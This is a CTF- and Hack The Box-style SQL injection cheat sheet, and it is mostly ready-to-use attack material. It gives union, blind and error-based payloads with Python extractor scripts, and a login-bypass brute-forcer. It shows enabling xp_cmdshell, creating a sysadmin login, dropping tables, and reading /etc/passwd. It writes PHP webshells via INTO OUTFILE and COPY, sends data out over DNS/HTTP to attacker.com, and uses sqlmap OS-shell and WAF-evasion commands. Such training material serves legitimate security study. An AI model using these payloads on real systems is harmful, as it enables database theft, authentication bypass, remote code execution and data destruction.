> **SQL Injection** (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. It's the most common web vulnerability in CTFs and HTB boxes — mastering it is non-negotiable. This guide focuses on practical exploitation: from quick wins to blind exfiltration and file system access.

---

## Quickstart — The Universal Test

```bash
# The 5 characters that flag SQLi in 90% of CTF challenges:
'       # single quote
"       # double quote
\       # backslash (escape char, triggers errors)
)       # closing parenthesis (nested queries)
-- -    # comment
```

### Manual injection checklist (in order of speed)

```bash
# 1. Trigger a syntax error
http://target.htb/page.php?id=1'
http://target.htb/page.php?id=1"
http://target.htb/page.php?id=1\

# 2. Basic boolean test
http://target.htb/page.php?id=1' AND '1'='1    # true  → same page
http://target.htb/page.php?id=1' AND '1'='2    # false → different page

# 3. Comment variants
-- -    # MySQL/MariaDB, MSSQL
--      # PostgreSQL
#       # MySQL with URL encoding (%23)
/**/    # Inline comment (bypasses space filters)

# 4. Union test — find number of columns
http://target.htb/page.php?id=1' ORDER BY 1-- -
http://target.htb/page.php?id=1' ORDER BY 2-- -
http://target.htb/page.php?id=1' ORDER BY 3-- -   # error → 2 columns
```

---

## Database Fingerprinting

Knowing the DBMS determines what techniques work. Use these probes:

| Technique | MySQL | PostgreSQL | MSSQL | Oracle |
| :-------- | :---: | :--------: | :---: | :----: |
| `SELECT @@version` | ✅ | ❌ | ✅ | ❌ |
| `SELECT version()` | ❌ | ✅ | ❌ | ❌ |
| `SELECT banner FROM v$version` | ❌ | ❌ | ❌ | ✅ |
| `SELECT 1/0` (div by zero) | `Warning` | `ERROR` | `ERROR` | `ERROR` |
| Comment `--` | ✅ | ✅ | ✅ | ✅ |
| Comment `#` | ✅ | ❌ | ❌ | ❌ |
| String concat `CONCAT()` | ✅ | ✅ | ❌ | ❌ |
| String concat `\|\|` | ❌ | ✅ | ❌ | ✅ |
| String concat `+` | ❌ | ❌ | ✅ | ❌ |
| `SELECT SLEEP(5)` | ✅ | ❌ | ❌ | ❌ |
| `SELECT pg_sleep(5)` | ❌ | ✅ | ❌ | ❌ |
| `WAITFOR DELAY '0:0:5'` | ❌ | ❌ | ✅ | ❌ |
| `DBMS_LOCK.SLEEP(5)` | ❌ | ❌ | ❌ | ✅ |

```sql
-- Quick fingerprint via SQLMap (if automation is allowed)
sqlmap -u "http://target.htb/page.php?id=1" --fingerprint --batch
```

---

## Union-Based Injection — Read Data Directly

The endgame of union injection: get data dumped straight into the page. Requires finding column count, data types, and the right column positions.

### Step 1 — Find column count

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -    -- error → columns = 2
```

### Step 2 — Test which columns reflect on the page

```sql
-- NULL matches any data type — use for safe union testing
' UNION SELECT NULL-- -            # error → need more columns
' UNION SELECT NULL,NULL-- -       # ok → 2 columns
' UNION SELECT 1,2-- -             # see which numbers appear on page
' UNION SELECT 'test',NULL-- -     # test which is a string
' UNION SELECT 1,@@version-- -     # check DBMS version
```

### Step 3 — Extract data once you know the reflection point

```sql
-- Database names (MySQL/MariaDB)
' UNION SELECT 1,schema_name FROM information_schema.schemata-- -

-- Table names in current database
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- -

-- Column names in target table
' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Dump contents
' UNION SELECT 1,CONCAT(username,0x3a,password) FROM users-- -
```

### Database-Specific Information Schema Queries

```sql
-- === MySQL / MariaDB ===
-- All databases
SELECT schema_name FROM information_schema.schemata
-- Tables in a database
SELECT table_name FROM information_schema.tables WHERE table_schema='dbname'
-- Columns in a table
SELECT column_name FROM information_schema.columns WHERE table_name='users'
-- Current database
SELECT database()

-- === PostgreSQL ===
-- All databases
SELECT datname FROM pg_database
-- Tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
-- Columns in a table
SELECT column_name FROM information_schema.columns WHERE table_name='users'
-- Alternative (pg_catalog)
SELECT relname FROM pg_catalog.pg_class WHERE relkind='r'
-- Current database
SELECT current_database()

-- === MSSQL ===
-- All databases
SELECT name FROM master..sysdatabases
SELECT DB_NAME(n) FROM master..sysdatabases    -- iterate n
-- Tables in current database
SELECT name FROM sysobjects WHERE xtype='U'
SELECT table_name FROM information_schema.tables
-- Columns in a table
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')
SELECT column_name FROM information_schema.columns WHERE table_name='users'
-- Current database
SELECT DB_NAME()

-- === Oracle ===
-- All tables (requires DBA_TABLES or ALL_TABLES)
SELECT table_name FROM all_tables
SELECT owner,table_name FROM all_tables
-- Columns in a table
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
-- Current database
SELECT ora_database_name FROM dual
SELECT global_name FROM global_name
-- List schemas
SELECT username FROM all_users
```

### Union Injection — All-in-One Data Dump

```sql
-- MySQL / MariaDB — dump all tables in current DB
' UNION SELECT 1,CONCAT(table_schema,0x2e,table_name,0x3a,GROUP_CONCAT(column_name))
FROM information_schema.columns GROUP BY table_name-- -

-- PostgreSQL — same
' UNION SELECT 1,string_agg(column_name,',') FROM information_schema.columns
WHERE table_schema='public' GROUP BY table_name-- -
```

### One-Row Limit Bypass (MySQL)

```sql
-- Use GROUP_CONCAT or LIMIT tricks when the app only shows the first row
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x3c,0x62,0x72,0x3e) FROM users-- -

-- Or iterate with LIMIT
' UNION SELECT username,password FROM users LIMIT 0,1-- -
' UNION SELECT username,password FROM users LIMIT 1,1-- -
' UNION SELECT username,password FROM users LIMIT 2,1-- -
```

---

## Boolean-Based Blind SQLi

When the page changes subtly (different HTTP status, content length, or presence of a string) based on a true/false condition.

### The core technique

```sql
-- Test if first character of database name is 'a'
' AND SUBSTRING((SELECT database()),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))=97-- -

-- Test if first table name starts with 'u'
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables
  WHERE table_schema=database() LIMIT 1)='u'-- -
```

### Automated Boolean Blind Exfiltration Script (Python)

```python
#!/usr/bin/env python3
"""Boolean-based blind SQLi data extractor."""
import requests
import string
import sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://target.htb/page.php?id=1"
SUCCESS_STRING = "Welcome"  # string that appears only on TRUE
CHARSET = string.ascii_lowercase + string.digits + "_-!@#.:$"

def check(payload):
    r = requests.get(URL + payload)
    return SUCCESS_STRING in r.text

def extract_length(query):
    for l in range(1, 101):
        payload = f"' AND LENGTH(({query}))={l}-- -"
        if check(payload):
            print(f"[+] Length: {l}")
            return l
    return 0

def extract_value(query, length):
    result = ""
    for pos in range(1, length + 1):
        for c in CHARSET:
            payload = f"' AND SUBSTRING(({query}),{pos},1)='{c}'-- -"
            if check(payload):
                result += c
                print(f"[+] Position {pos}: '{c}' → {result}")
                break
    return result

def extract_databases():
    """Extract all database names via boolean blind."""
    # Count databases
    count = 0
    for count in range(50):
        payload = f"' AND (SELECT COUNT(*) FROM information_schema.schemata)={count}-- -"
        if check(payload):
            print(f"[+] Total databases: {count}")
            break
    else:
        print("[-] Could not determine database count"), sys.exit(1)

    # Extract each database name
    for db_idx in range(count):
        query = f"SELECT schema_name FROM information_schema.schemata LIMIT {db_idx},1"
        l = extract_length(query)
        if l > 0:
            db_name = extract_value(query, l)
            print(f"[✓] Database {db_idx}: {db_name}")

extract_databases()
```

---

## Time-Based Blind SQLi

Use when there's NO visible difference between true/false — the page always looks the same. Relies on conditional delays.

### Sleep payloads by DBMS

```sql
-- MySQL / MariaDB
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(3),0)-- -
' AND (SELECT IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(3),0))-- -

-- PostgreSQL
' AND (SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a'
  THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -

-- MSSQL
'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))=97) WAITFOR DELAY '0:0:3'-- -
'; IF (SELECT SUBSTRING(DB_NAME(),1,1))='a' WAITFOR DELAY '0:0:3'-- -

-- Oracle
' AND (SELECT CASE WHEN SUBSTR(global_name,1,1)='A'
  THEN DBMS_LOCK.SLEEP(3) ELSE 1 END FROM global_name)=1-- -

-- SQLite
' AND (SELECT CASE WHEN SUBSTR(sqlite_version(),1,1)='3'
  THEN RANDOMBLOB(500000000) ELSE 1 END)-- -
```

### Python Time-Based Extractor (MySQL)

```python
#!/usr/bin/env python3
"""Time-based blind SQLi data extractor."""
import requests
import string
import sys
import time

URL = sys.argv[1] if len(sys.argv) > 1 else "http://target.htb/page.php?id=1"
TIMEOUT = 3  # seconds — must match your SLEEP(N)
CHARSET = string.ascii_lowercase + string.digits + "_-!@#.:$"

def check(query):
    payload = f"' AND IF({query},SLEEP({TIMEOUT}),0)-- -"
    start = time.time()
    try:
        requests.get(URL + payload, timeout=TIMEOUT + 3)
    except requests.exceptions.RequestException:
        pass
    return (time.time() - start) >= TIMEOUT

def extract_length(subject):
    for l in range(1, 101):
        if check(f"LENGTH(({subject}))={l}"):
            print(f"[+] Length: {l}")
            return l
    return 0

def extract_value(subject, length):
    result = ""
    for pos in range(1, length + 1):
        for c in CHARSET:
            if check(f"ASCII(SUBSTRING(({subject}),{pos},1))={ord(c)}"):
                result += c
                print(f"[+] Position {pos}: '{c}' → {result}")
                break
    return result

# Extract current database name
db_len = extract_length("SELECT database()")
db = extract_value("SELECT database()", db_len)
print(f"[✓] Database: {db}")
```

---

## Error-Based SQLi

When the application shows database errors, use them to extract data. Way faster than blind!

### MySQL / MariaDB — ExtractValue & UpdateXML

```sql
-- Database name
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -

-- Table names (one by one due to GROUP_CONCAT limit)
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,1)))-- -

-- Column names
' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns
  WHERE table_name='users' LIMIT 0,1)))-- -

-- Data (substring to stay under 32-char error limit)
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(username,0x3a,password)
  FROM users),1,30)))-- -
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(username,0x3a,password)
  FROM users),31,60)))-- -
```

### PostgreSQL — CAST Error

```sql
' AND 1=CAST((SELECT current_database()) AS int)-- -
' AND 1=CAST((SELECT table_name FROM information_schema.tables
  WHERE table_schema='public' LIMIT 1) AS int)-- -
' AND 1=CAST((SELECT string_agg(column_name,',') FROM information_schema.columns
  WHERE table_name='users') AS int)-- -
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
```

### MSSQL — CONVERT / CAST Error

```sql
'; SELECT CONVERT(int,(SELECT DB_NAME()))-- -
'; SELECT CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
'; SELECT CONVERT(int,(SELECT TOP 1 name FROM syscolumns
  WHERE id=OBJECT_ID('users')))-- -
'; SELECT CONVERT(int,(SELECT TOP 1 password FROM users))-- -
```

### Oracle — TO_CHAR Error

```sql
' AND 1=TO_CHAR(1/(SELECT LENGTH(global_name) FROM global_name))-- -
```

---

## Stacked Queries (`;`)

If the app supports multiple statements (common in MSSQL, PostgreSQL; rare in MySQL with PHP/mysqli), you can chain destructive or administrative queries.

```sql
-- MSSQL — enable xp_cmdshell via stacked queries
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -

-- MSSQL — create a user
'; EXEC sp_addlogin 'hacker','Passw0rd!';-- -
'; EXEC sp_addsrvrolemember 'hacker','sysadmin';-- -

-- MySQL — insert data (if stacked queries are supported)
'; INSERT INTO users(username,password) VALUES('hacker','pass')-- -
'; DROP TABLE users-- -   # ⚠️ destructive!

-- PostgreSQL
'; CREATE TABLE pwn (t TEXT); INSERT INTO pwn VALUES('owned');-- -
```

> ⚠️ **MySQL + PHP:** `mysql_query()` and `mysqli_query()` do NOT support stacked queries. Use `mysqli_multi_query()` or PDO with `PDO::MYSQL_ATTR_MULTI_STATEMENTS`. In practice, stacked queries rarely work on MySQL/PHP CTF boxes.

---

## Reading Files via SQLi

```sql
-- MySQL / MariaDB — LOAD_FILE (requires FILE privilege + readable file)
' UNION SELECT 1,LOAD_FILE('/etc/passwd')-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php')-- -
' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764)-- -   # hex-encoded path

-- MSSQL — xp_cmdshell (if enabled)
'; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'-- -

-- MSSQL — OPENROWSET
'; SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x-- -

-- PostgreSQL — COPY / pg_read_file (superuser)
'; COPY users FROM '/etc/passwd'-- -
'; SELECT pg_read_file('/etc/passwd',0,200)-- -

-- PostgreSQL — lo_import (large object)
'; SELECT lo_import('/etc/passwd')-- -
```

### MySQL LOAD_FILE Permissions Check

```sql
-- Check if you have FILE privilege
' UNION SELECT 1,group_concat(user,0x3a,file_priv) FROM mysql.user-- -

-- Check secure_file_priv (limits LOAD_FILE and INTO OUTFILE paths)
' UNION SELECT 1,@@secure_file_priv-- -
-- NULL → read/write anywhere
-- /var/lib/mysql-files/ → only that directory
-- empty string → disabled entirely (MySQL ≥ 5.7 default)
```

---

## Writing Files via SQLi (Webshells)

```sql
-- MySQL / MariaDB — INTO OUTFILE (requires FILE + write permission)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -

-- MySQL — INTO DUMPFILE (same, but writes exact binary — better for binaries)
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'-- -

-- MSSQL — xp_cmdshell (write via echo)
'; EXEC xp_cmdshell 'echo ^<^?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'-- -

-- PostgreSQL — COPY
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'-- -

-- PostgreSQL — lo_export (large object export)
'; CREATE TABLE cmd (t TEXT); INSERT INTO cmd VALUES('<?php system($_GET["cmd"]); ?>');-- -
'; SELECT lo_from_bytea(0, decode(replace(t,'',''),'escape')) FROM cmd;-- -

-- Oracle — UTL_FILE (requires CREATE DIRECTORY privilege)
' UNION SELECT UTL_FILE.FOPEN('WEB_DIR','shell.jsp','w') FROM dual-- -
```

### Web Shell Path Guessing Cheat Sheet

| Platform | Default Web Roots |
| :------- | :---------------- |
| **Linux + Apache** | `/var/www/html/`, `/var/www/`, `/srv/http/`, `/opt/lampp/htdocs/` |
| **Linux + Nginx** | `/usr/share/nginx/html/`, `/var/www/html/` |
| **Windows + IIS** | `C:\inetpub\wwwroot\`, `C:\xampp\htdocs\` |
| **Windows + XAMPP** | `C:\xampp\htdocs\`, `C:\xampp\www\` |
| **Tomcat** | `/opt/tomcat/webapps/ROOT/` |

---

## Out-of-Band (OOB) SQLi

When the app is completely blind AND async, make the database reach out to your server via DNS or HTTP.

### DNS Exfiltration

```sql
-- MySQL / MariaDB — LOAD_FILE with UNC path (Windows only!)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))-- -

-- MSSQL — xp_dirtree / xp_fileexist
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -
'; DECLARE @a VARCHAR(1024); SET @a=(SELECT DB_NAME());
  EXEC master..xp_dirtree CONCAT('\\\\',@a,'.attacker.com\\a')-- -

-- Oracle — UTL_INADDR / UTL_HTTP (requires network ACL)
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT global_name FROM global_name)||'.attacker.com') FROM dual-- -

-- PostgreSQL — COPY with program (superuser, PG ≥ 9.3)
'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'-- -
```

### HTTP Exfiltration (Oracle UTL_HTTP)

```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/exfil?data='||
  (SELECT password FROM users WHERE ROWNUM=1)) FROM dual-- -
```

### Setup OOB Listener

```bash
# DNS listener (you'll need a domain with NS pointing to your server)
sudo tcpdump -i tun0 udp port 53 -n

# Or use Burp Collaborator / interactsh
interactsh-client -json -o interactsh.log

# Simple HTTP listener
python3 -m http.server 80
```

---

## Second-Order SQL Injection

The payload is stored now (e.g., in a username or profile field) and executed later when a different part of the app retrieves it without sanitizing.

```sql
-- Register a username like:
admin' OR '1'='1

-- Or more aggressively:
admin'; DROP TABLE users;-- -

-- The injection fires when an admin page lists users with a query like:
-- SELECT * FROM users WHERE username='$STORED_USERNAME'
```

> **Key indicator:** Input is sanitized on insert but NOT on retrieval/display. Test by registering a username with `'` and looking for errors elsewhere in the app.

---

## Login Panel Bypass — SQLi in Login Forms

The typical vulnerable login query pattern is:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass'
```

If the app concatenates your input directly without sanitizing, you can manipulate the SQL logic to authenticate without valid credentials. The goal is to make the `WHERE` condition always evaluate to `TRUE`.

### Step 1 — Understand the injection context

Before launching payloads, determine what type of quotes and structure the query expects. Test **both fields** (username and password) separately:

```bash
# Test 1: Error with single quote in username?
Username: admin'
Password: test

# Test 2: Error with double quote?
Username: admin"
Password: test

# Test 3: Error in the password field?
Username: admin
Password: test'

# Test 4: Backslash?
Username: admin\
Password: test
```

> 💡 **If you see a SQL error** → the app is vulnerable and you know where to inject.
> 💡 **If you don't see an error but the page changes** (e.g. "Wrong password" vs blank page) → possible boolean blind.
> 💡 **If there's no visible difference** → try time-based blind.

### Step 2 — Classic bypass payloads

Try these in the **username** field, leaving password empty or with any value:

```sql
-- Universal payloads (work on MySQL, PostgreSQL, MSSQL)
admin'-- -
admin'#
admin'/*
' OR 1=1-- -
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1'/*
" OR "1"="1"-- -
" OR 1=1-- -
') OR ('1'='1
') OR 1=1-- -
admin' OR '1'='1

-- Without knowing any username — OR returns the first user
' OR '1'='1'-- -
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
OR 1=1-- -
OR '1'='1'-- -

-- Admin-specific — if you know the admin user exists
admin'-- -
admin' #
admin'/*
ad'||'min'-- -            # concat bypass if "admin" is filtered
adm' 'in'-- -              # space as concatenator (MySQL)
```

### Step 3 — If there are parentheses in the query

Many apps use functions like `MD5()`, `SHA1()`, or simply parentheses:

```sql
-- Typical vulnerable query with hash:
-- SELECT * FROM users WHERE (username='$user') AND (password=MD5('$pass'))

') OR 1=1-- -
') OR ('1'='1
') OR 1=1#
') OR ('1'='1')-- -

-- Double parentheses
')) OR 1=1-- -
')) OR ('1'='1

-- With hash in password
admin')-- -
') OR 1=1) AND ('x'='x
' OR 1=1) AND MD5('x')=MD5('x
```

### Step 4 — Advanced bypass techniques

```sql
-- UNION to log in as another user (if you know a username)
' UNION SELECT 1,'admin','stolen_hash',4,5-- -

-- If you need to match the password hash with UNION
' UNION SELECT 1,'admin',MD5('123'),4,5-- -

-- Insert a new admin (if stacked queries work)
admin'; INSERT INTO users(username,password) VALUES('hacker','pass')-- -

-- Use LIKE/IN to enumerate users (if error messages change)
' OR username LIKE 'a%'-- -
' OR username LIKE 'b%'-- -

-- Time-based to enumerate valid usernames
' OR IF(username LIKE 'a%',SLEEP(3),0)-- -
```

### Database-Specific Login Bypass Payloads

| DBMS | Payload | Note |
| :--- | :------ | :--- |
| **MySQL** | `admin'-- -` | Space after `--` is mandatory |
| **MySQL** | `admin'#` | `#` needs no space |
| **MySQL** | `admin'/*` | Unclosed inline comment (MySQL tolerates it; Oracle/MSSQL may error) |
| **PostgreSQL** | `admin'--` | `--` without extra space |
| **PostgreSQL** | `admin'/**/` | Inline comment |
| **MSSQL** | `admin'--` | Same as PostgreSQL |
| **Oracle** | `admin'--` | Oracle `--` needs a space |
| **SQLite** | `admin'--` | `--` with or without space |

### SQLMap for login forms

```bash
# Method 1 — Using --data (most direct)
sqlmap -u "http://target.htb/login.php" --data="user=admin&pass=test" --batch

# Method 2 — Specify parameters to test
sqlmap -u "http://target.htb/login.php" --data="user=admin&pass=test" -p "user,pass" --batch

# Method 3 — Using Burp request (recommended)
# 1. Intercept the POST with Burp Suite
# 2. Save it as login_request.txt
# 3. Mark parameters to test with * -> user=*admin*&pass=*test*
sqlmap -r login_request.txt --batch

# Method 4 — If the login uses JSON
sqlmap -u "http://target.htb/api/login" \
  --data='{"username":"admin","password":"test"}' \
  --headers="Content-Type: application/json" --batch

# Method 5 — Force boolean blind technique (logins often return true/false)
sqlmap -u "http://target.htb/login.php" --data="user=admin&pass=test" \
  --technique=B --batch

# Method 6 — With high level/risk (tests OR, UNION, stacked, etc.)
sqlmap -u "http://target.htb/login.php" --data="user=admin&pass=test" \
  --level=5 --risk=3 --batch
```

> ⚠️ **Be careful with `--risk=3`** — it uses `OR 1=1` which may modify/return ALL rows. In a login this is harmless, but in an UPDATE/DELETE it could be disastrous.

### Script — Login Bypass Brute-forcer (Python)

```python
#!/usr/bin/env python3
"""Test login bypass payloads against a form.

⚠️  LIMITATIONS:
- Does not handle CSRF tokens automatically. If the form uses CSRF,
  modify the script to do a GET first, extract the token with
  regex (r'name="csrf_token" value="([^"]+)"'), and add it to the POST.
- Does not handle rate limiting — add delays if the server blocks requests.
"""
import requests
import sys

URL = sys.argv[1] if len(sys.argv) > 1 else "http://target.htb/login.php"

# Payloads organized by category
PAYLOADS = [
    # Comments (with known username)
    ("admin'-- -", ""),
    ("admin'#", ""),
    ("admin'/*", ""),
    ("admin')-- -", ""),
    ("admin')#", ""),
    ('admin"-- -', ""),
    ("admin'-- -", "anything"),

    # OR bypass (without known username)
    ("' OR 1=1-- -", ""),
    ("' OR '1'='1'-- -", ""),
    ("' OR 1=1#", ""),
    ("' OR '1'='1'#", ""),
    ("' OR 1=1/*", ""),
    ('" OR 1=1-- -', ""),
    ('" OR "1"="1"-- -', ""),
    ("OR 1=1-- -", ""),
    ("OR '1'='1'-- -", ""),
    # ⚠️ '||' means OR in MySQL, but CONCAT(||) in PostgreSQL/Oracle
    ("'||'1'='1", ""),                 # MySQL: works as OR. PG/Oracle: use ' OR '1'='1 instead
    ("'||1=1-- -", ""),
    ("') OR 1=1-- -", ""),
    ("') OR ('1'='1", ""),
    ("')) OR 1=1-- -", ""),
    ("')) OR ('1'='1", ""),

    # Alternative operators
    ("' OR 1#", ""),
    ("admin' OR '1'='1", ""),
    ("'='", "'='"),                 # password = password
    ("' OR 'x'='x", "' OR 'x'='x"),  # both fields with OR

    # LIKE bypass
    ("' OR 1 LIKE 1-- -", ""),
    ("' OR 'x' LIKE 'x'-- -", ""),

    # UNION (if you know the table structure)
    ("' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -", ""),  # MD5('password')
]

def try_login(user, password):
    """Send POST to the login form."""
    data = {"username": user, "password": password}
    r = requests.post(URL, data=data, allow_redirects=True)
    return r

# Baseline — legitimate failed login
baseline = try_login("nonexistent_user_12345", "wrong_password_54321")
print(f"[*] Baseline: {len(baseline.text)} bytes, status={baseline.status_code}")
print(f"[*] Baseline snippet: {baseline.text[:100].strip()}")
print()

# Test each payload
for i, (user, pwd) in enumerate(PAYLOADS):
    r = try_login(user, pwd)
    is_diff = len(r.text) != len(baseline.text) or r.status_code != baseline.status_code
    has_redirect = r.status_code in (301, 302, 303, 307, 308)
    
    # Detect successful bypass (redirect, page change, session cookie)
    if has_redirect or is_diff:
        flag = "✅ BYPASS?" if has_redirect else "⚠️  DIFF"
        print(f"{flag} [{i}] user='{user}' pass='{pwd}' → {len(r.text)}B, status={r.status_code}")
        if r.headers.get("Location"):
            print(f"     → Redirect: {r.headers['Location']}")
        if r.cookies:
            print(f"     → Cookies: {dict(r.cookies)}")

print("\n[✓] Done. Review results manually — any redirect or session cookie = likely bypass.")
```

### Quick checklist for login forms

1. **Test `'` in username** → if SQL error → vulnerable, keep testing
2. **`admin'-- -`** → classic bypass if admin exists
3. **`' OR 1=1-- -`** → bypass without knowing a username
4. **`') OR 1=1-- -`** → if there are parentheses
5. **`' OR 1=1#`** → alternative comment
6. **SQLMap** → `sqlmap -u "URL" --data="user=admin&pass=test" --batch`
7. **If nothing works** → try time-based blind with `SLEEP()`
8. **Don't forget the password field** → sometimes vulnerable even when username isn't
9. **If the server uses `addslashes()` / magic quotes** → try `admin\' OR 1=1-- -` (backslash escapes the escape) or `%df'` in GBK charset (wide byte bypass)

### curl for manually testing login forms

```bash
# Basic POST — curl handles quotes without issues (better than a browser)
curl -d "user=admin'-- -&pass=" http://target.htb/login.php
curl -d "user=' OR 1=1-- -&pass=" http://target.htb/login.php

# With --data-urlencode if you need explicit encoding
curl --data-urlencode "user=' OR 1=1-- -" --data-urlencode "pass=" http://target.htb/login.php

# JSON login
curl -X POST http://target.htb/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"'-- -","password":"test"}'

# Follow redirects and show headers (to see session Set-Cookie)
curl -d "user=admin'-- -&pass=" http://target.htb/login.php -L -v
```

---

## SQLMap — Automated Swiss Army Knife

### Essential SQLMap Commands

```bash
# Basic scan — detect and exploit
sqlmap -u "http://target.htb/page.php?id=1" --batch

# Specify parameter (when multiple exist)
sqlmap -u "http://target.htb/search.php" --data="q=test&cat=1" -p "cat" --batch

# POST request with data
sqlmap -u "http://target.htb/login.php" --data="user=admin&pass=test" --batch

# Cookie-based injection
sqlmap -u "http://target.htb/dashboard.php" --cookie="PHPSESSID=abc123;id=1" -p "id" --batch

# Request file (capture with Burp, save to file)
sqlmap -r request.txt --batch

# Enumerate databases
sqlmap -u "http://target.htb/page.php?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "http://target.htb/page.php?id=1" -D dbname --tables --batch

# Dump a table
sqlmap -u "http://target.htb/page.php?id=1" -D dbname -T users --dump --batch

# Dump all databases (⚠️ heavy, use with care)
sqlmap -u "http://target.htb/page.php?id=1" --dump-all --batch

# OS shell (MySQL/MSSQL)
sqlmap -u "http://target.htb/page.php?id=1" --os-shell --batch

# SQL shell (interactive)
sqlmap -u "http://target.htb/page.php?id=1" --sql-shell --batch

# Get a reverse shell (MSSQL xp_cmdshell or MySQL UDF)
sqlmap -u "http://target.htb/page.php?id=1" --os-pwn --batch
```

### SQLMap Tuning Flags

| Flag | What it does | When to use |
| :--- | :----------- | :---------- |
| `--level=5` | Max test depth (tests HTTP headers, cookies, User-Agent) | Thorough scan, cookie-based injection |
| `--risk=3` | Max risk (uses OR-based payloads, heavy queries) | When `--level=5` isn't enough |
| `--dbms=mysql` | Force database type | Speeds up scan when you know the DBMS |
| `--technique=U` | Only Union-based | Target specific technique |
| `--technique=B` | Only Boolean blind | |
| `--technique=T` | Only Time-based blind | |
| `--technique=E` | Only Error-based | |
| `--technique=S` | Only Stacked queries | |
| `--technique=BEUST` | All techniques (default) | |
| `--tamper=space2comment` | Bypass WAF space filters | Space → `/**/` |
| `--tamper=between,randomcase,space2comment` | Multiple tampers (comma-separated) | Aggressive WAF bypass |
| `--delay=1` | 1-second delay between requests | Evade rate limiting |
| `--time-sec=5` | Time-based delay sensitivity (default 5) | Noisy networks — increase to reduce false positives |
| `--threads=10` | Concurrent threads (default 1) | Speed up blind SQLi (⚠️ can miss results) |
| `--no-cast` | Skip casting | Avoids errors in edge cases |
| `--prefix="')"` | Custom injection prefix | When auth doesn't detect syntax |
| `--suffix="-- -"` | Custom injection suffix | |
| `--union-cols=5` | Manually set union column count | When auto-detection fails |
| `--mobile` | Mobile User-Agent | Evade WAF |
| `--random-agent` | Random User-Agent per request | Basic WAF evasion |

### SQLMap Tamper Scripts — The Ones That Actually Work

```bash
# WAF Bypass — these are tried-and-true in CTFs
--tamper=space2comment        # spaces → /**/
--tamper=space2dash           # spaces → --%0a
--tamper=space2plus           # spaces → +
--tamper=space2mysqlblank     # spaces → %0a,%0b,%0c,%0d (MySQL quirks)
--tamper=between              # > → NOT BETWEEN 0 AND
--tamper=equaltolike          # = → LIKE
--tamper=greatest             # > → GREATEST(x,y+1)=x
--tamper=randomcase           # sElEcT (keyword case randomizer)
--tamper=charunicodeencode    # URL-encode as %u0041 (IIS/ASP)
--tamper=charencode           # URL-encode all chars
--tamper=apostrophemask       # ' → %EF%BC%87 (UTF-8 single quote)
--tamper=percentage           # Appends % before each char (ASP bypass)
--tamper=versionedmorekeywords # /*!50000SELECT*/ (MySQL versioned comments)

# Combine multiple tampers (aggressive WAF)
--tamper=space2comment,randomcase,between,charencode
```

### SQLMap — Dealing with CSRF & Authenticated Sessions

```bash
# 1. Capture a request with Burp, save as request.txt
# 2. Make sure you have the session cookie and CSRF token
# 3. Let SQLMap handle CSRF token auto-extraction
sqlmap -r request.txt --csrf-token="csrf_token" --batch

# Or manually specify everything
sqlmap -u "http://target.htb/admin.php?id=1" \
  --cookie="PHPSESSID=abc123; csrf=xyz789" \
  --csrf-token="csrf" --csrf-url="http://target.htb/admin.php" \
  --batch
```

---

## WAF Bypass Techniques

### 0. URL Encoding — Always Needed in the Browser!

> ⚠️ When testing in a browser URL bar, you MUST URL-encode your payloads. Use `curl` or Burp Repeater instead, or encode manually:

```bash
# In the browser, ' → %27, space → %20 or +, # → %23, -- → --%20
# Instead of:  http://target.htb/page.php?id=1' UNION SELECT 1,2-- -
# Use:         http://target.htb/page.php?id=1%27%20UNION%20SELECT%201,2--%20-

# Better: use curl to avoid encoding headaches
curl "http://target.htb/page.php?id=1' UNION SELECT 1,2-- -"
